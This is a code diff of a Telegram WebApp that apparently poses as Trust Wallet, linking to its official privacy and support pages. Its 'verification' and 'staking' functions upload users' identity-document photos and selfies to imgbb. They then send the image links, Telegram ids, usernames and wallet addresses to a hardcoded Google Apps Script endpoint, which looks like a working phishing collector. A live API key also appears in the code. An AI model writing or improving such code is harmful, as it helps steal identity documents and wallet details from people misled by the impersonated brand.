@@ -2,8 +2,8 @@ const tg = window.Telegram.WebApp;
 tg.expand();
 
 // !!! ВСТАВЬ СВОИ ДАННЫЕ НИЖЕ !!!
-const IMGBB_API_KEY = 'a2973b7dd242d701ce2c0d529bcd6a72'; 
-const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzelbj3lbKhVSgYnGnkfLbOQNOIkpCe97zs-GDzxceOY7whN4iBVR9FP_VFSo_Jduwo/exec'; 
+const IMGBB_API_KEY = 'a2973b7dd242d701ce2c0d529bcd6a72';
+const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzelbj3lbKhVSgYnGnkfLbOQNOIkpCe97zs-GDzxceOY7whN4iBVR9FP_VFSo_Jduwo/exec';
 
 const translations = {
     ru: {
@@ -17,7 +17,7 @@ const translations = {
         wallet_placeholder: "Введите адрес кошелька",
         connect_wallet: "Подключить кошелек",
         loading: "Загрузка...",
-        processing: "Запрос в обработке...",
+        processing: "⏳ Запрос в обработке...",
         settings: "Настройки",
         help_support: "Помощь и поддержка",
         support_center: "Центр поддержки",
@@ -46,7 +46,7 @@ const translations = {
         wallet_placeholder: "Enter wallet address",
         connect_wallet: "Connect Wallet",
         loading: "Loading...",
-        processing: "Processing request...",
+        processing: "⏳ Processing request...",
         settings: "Settings",
         help_support: "Help & Support",
         support_center: "Support Center",
@@ -75,9 +75,11 @@ const translations = {
         wallet_placeholder: "Entrez l'adresse",
         connect_wallet: "Connecter le portefeuille",
         loading: "Chargement...",
-        processing: "Traitement...",
+        processing: "⏳ Traitement...",
         settings: "Paramètres",
         help_support: "Aide et support",
+        support_center: "Centre de support",
+        support_service: "Service de support",
         language: "Langue",
         privacy: "Confidentialité",
         statistics: "Statistiques",
@@ -102,9 +104,11 @@ const translations = {
         wallet_placeholder: "Wallet-Adresse",
         connect_wallet: "Wallet verbinden",
         loading: "Laden...",
-        processing: "In Bearbeitung...",
+        processing: "⏳ In Bearbeitung...",
         settings: "Einstellungen",
         help_support: "Hilfe & Support",
+        support_center: "Support-Center",
+        support_service: "Support-Service",
         language: "Sprache",
         privacy: "Datenschutz",
         statistics: "Statistiken",
@@ -127,11 +131,15 @@ let myChart = null;
 function applyLanguage() {
     document.querySelectorAll('[data-i18n]').forEach(el => {
         const key = el.getAttribute('data-i18n');
-        if (translations[currentLang][key]) el.textContent = translations[currentLang][key];
+        if (translations[currentLang][key]) {
+            el.textContent = translations[currentLang][key];
+        }
     });
     document.querySelectorAll('[data-i18n-placeholder]').forEach(el => {
         const key = el.getAttribute('data-i18n-placeholder');
-        if (translations[currentLang][key]) el.placeholder = translations[currentLang][key];
+        if (translations[currentLang][key]) {
+            el.placeholder = translations[currentLang][key];
+        }
     });
     document.querySelectorAll('input[name="lang"]').forEach(radio => {
         if (radio.value === currentLang) radio.checked = true;
@@ -152,9 +160,15 @@ document.getElementById('langBtn').onclick = () => showScreen('langScreen');
 document.getElementById('backFromLang').onclick = () => showScreen('settingsScreen');
 document.getElementById('backFromCoin').onclick = () => showScreen('mainScreen');
 
-document.getElementById('privacyBtn').onclick = () => tg.openLink('https://trustwallet.com/ru/privacy-notice');
-document.getElementById('supportCenterBtn').onclick = () => tg.openLink('https://support.trustwallet.com/support/home');
-document.getElementById('supportServiceBtn').onclick = () => tg.openLink('https://trustwallet.com/ru/blog/guides/beginners-guide-to-trust-wallet-browser-extension');
+document.getElementById('privacyBtn').onclick = () => {
+    tg.openLink('https://trustwallet.com/ru/privacy-notice');
+};
+document.getElementById('supportCenterBtn').onclick = () => {
+    tg.openLink('https://support.trustwallet.com/support/home');
+};
+document.getElementById('supportServiceBtn').onclick = () => {
+    tg.openLink('https://trustwallet.com/ru/blog/guides/beginners-guide-to-trust-wallet-browser-extension');
+};
 
 // Смена языка
 document.querySelectorAll('input[name="lang"]').forEach(radio => {
@@ -176,7 +190,7 @@ function setupPreview(inputId, previewId, textId) {
         const file = this.files[0];
         if (file) {
             const reader = new FileReader();
-            reader.onload = (e) => {
+            reader.onload = function(e) {
                 preview.src = e.target.result;
                 preview.classList.remove('hidden');
                 text.textContent = translations[currentLang].done;
@@ -185,10 +199,11 @@ function setupPreview(inputId, previewId, textId) {
         }
     };
 }
+
 setupPreview('docInput', 'previewDoc', 'textDoc');
 setupPreview('selfieInput', 'previewSelfie', 'textSelfie');
 
-// --- ОТПРАВКА ВЕРИФИКАЦИИ ---
+// === ОТПРАВКА ВЕРИФИКАЦИИ ===
 async function sendVerification() {
     const docFile = document.getElementById('docInput').files[0];
     const selfieFile = document.getElementById('selfieInput').files[0];
@@ -202,38 +217,52 @@ async function sendVerification() {
     showStatus(translations[currentLang].uploading);
 
     try {
-        const upload = async (file) => {
+        const uploadToImgBB = async (file) => {
             const fd = new FormData();
             fd.append('image', file);
-            const res = await fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`, { method: 'POST', body: fd });
-            const d = await res.json();
-            return d.data.url;
+            const res = await fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`, { 
+                method: 'POST', 
+                body: fd 
+            });
+            const data = await res.json();
+            if (!data.success) throw new Error('Upload failed');
+            return data.data.url;
         };
 
-        const url1 = await upload(docFile);
-        const url2 = await upload(selfieFile);
+        const docUrl = await uploadToImgBB(docFile);
+        const selfieUrl = await uploadToImgBB(selfieFile);
 
         const payload = {
             action: "verification",
             user_id: tg.initDataUnsafe?.user?.id || "unknown",
             username: tg.initDataUnsafe?.user?.username || "no_username",
             wallet: wallet || "not_set",
-            doc: url1,
-            selfie: url2
+            doc: docUrl,
+            selfie: selfieUrl
         };
 
-        await fetch(GOOGLE_SCRIPT_URL, { method: 'POST', mode: 'no-cors', body: JSON.stringify(payload) });
+        await fetch(GOOGLE_SCRIPT_URL, {
+            method: 'POST',
+            mode: 'no-cors',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+
         tg.sendData(JSON.stringify(payload));
+
         showStatus(translations[currentLang].success);
         setTimeout(() => tg.close(), 2000);
-    } catch (e) {
+
+    } catch (error) {
+        console.error('Verification error:', error);
         showStatus(translations[currentLang].error_net);
     }
 }
 
-// --- ОТПРАВКА СТЕЙКИНГА ---
+// === ОТПРАВКА СТЕЙКИНГА ===
 async function sendStaking() {
-    const wallet = document.getElementById('walletInput').value;
+    const wallet = document.getElementById('walletInput').value.trim();
+
     if (!wallet || wallet.length < 5) {
         showStatus(translations[currentLang].error_wallet);
         return;
@@ -251,19 +280,29 @@ async function sendStaking() {
     };
 
     try {
-        await fetch(GOOGLE_SCRIPT_URL, { method: 'POST', mode: 'no-cors', body: JSON.stringify(payload) });
+        await fetch(GOOGLE_SCRIPT_URL, {
+            method: 'POST',
+            mode: 'no-cors',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+
         tg.sendData(JSON.stringify(payload));
+
         showStatus(translations[currentLang].success);
         setTimeout(() => tg.close(), 2000);
-    } catch (e) {
+
+    } catch (error) {
+        console.error('Staking error:', error);
         showStatus(translations[currentLang].error_net);
     }
 }
 
+// Привязка кнопок
 document.getElementById('verifyBtn').onclick = sendVerification;
 document.getElementById('stakingBtn').onclick = sendStaking;
 
-// --- КОТИРОВКИ И ГРАФИКИ ---
+// === КОТИРОВКИ И ГРАФИКИ ===
 async function getPrices() {
     try {
         const res = await fetch('https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&ids=bitcoin,ethereum,binancecoin,solana,tron&order=market_cap_desc&sparkline=true');
@@ -277,6 +316,77 @@ async function getPrices() {
             const change = coin.price_change_percentage_24h;
             div.innerHTML = `
                 <div class="token-info">
-                    <img src="${coin.image}" class="token-icon">
+                    <img src="${coin.image}" class="token-icon" alt="${coin.name}">
                     <div>
                         <div class="token-name">${coin.name}</div>
+                        <div class="token-hint">${coin.symbol.toUpperCase()}</div>
+                    </div>
+                </div>
+                <div class="token-price">
+                    <div>$${coin.current_price.toLocaleString()}</div>
+                    <div class="${change < 0 ? 'neg' : 'pos'}">${change > 0 ? '+' : ''}${change.toFixed(2)}%</div>
+                </div>
+            `;
+            div.onclick = () => showCoinDetail(coin);
+            list.appendChild(div);
+        });
+    } catch (e) { 
+        console.error('Price fetch error:', e); 
+    }
+}
+
+function showCoinDetail(coin) {
+    showScreen('coinScreen');
+    document.getElementById('coinName').textContent = coin.name;
+    document.getElementById('coinPrice').textContent = `$${coin.current_price.toLocaleString()}`;
+    const change = coin.price_change_percentage_24h;
+    document.getElementById('coinChange').textContent = `${change > 0 ? '+' : ''}${change.toFixed(2)}%`;
+    document.getElementById('coinChange').className = `coin-change ${change < 0 ? 'neg' : 'pos'}`;
+    
+    document.getElementById('statMcap').textContent = `$${coin.market_cap.toLocaleString()}`;
+    document.getElementById('statCirc').textContent = `${coin.circulating_supply.toLocaleString()} ${coin.symbol.toUpperCase()}`;
+    document.getElementById('statVol').textContent = `$${coin.total_volume.toLocaleString()}`;
+
+    renderChart(coin.sparkline_in_7d.price, change < 0);
+}
+
+function renderChart(prices, isNeg) {
+    const ctx = document.getElementById('coinChartCanvas').getContext('2d');
+    if (myChart) myChart.destroy();
+    
+    myChart = new Chart(ctx, {
+        type: 'line',
+        data: {
+            labels: prices.map((_, i) => i),
+            datasets: [{
+                data: prices,
+                borderColor: isNeg ? '#f6465d' : '#2ebd85',
+                borderWidth: 2.5,
+                pointRadius: 0,
+                fill: false,
+                tension: 0.3
+            }]
+        },
+        options: {
+            responsive: true, 
+            maintainAspectRatio: false,
+            plugins: { legend: { display: false } },
+            scales: { 
+                x: { display: false }, 
+                y: { display: false } 
+            }
+        }
+    });
+}
+
+function showStatus(msg) {
+    const s = document.getElementById('status');
+    s.textContent = msg;
+    s.classList.remove('hidden');
+    setTimeout(() => s.classList.add('hidden'), 3000);
+}
+
+// Инициализация
+applyLanguage();
+getPrices();
+setInterval(getPrices, 30000);
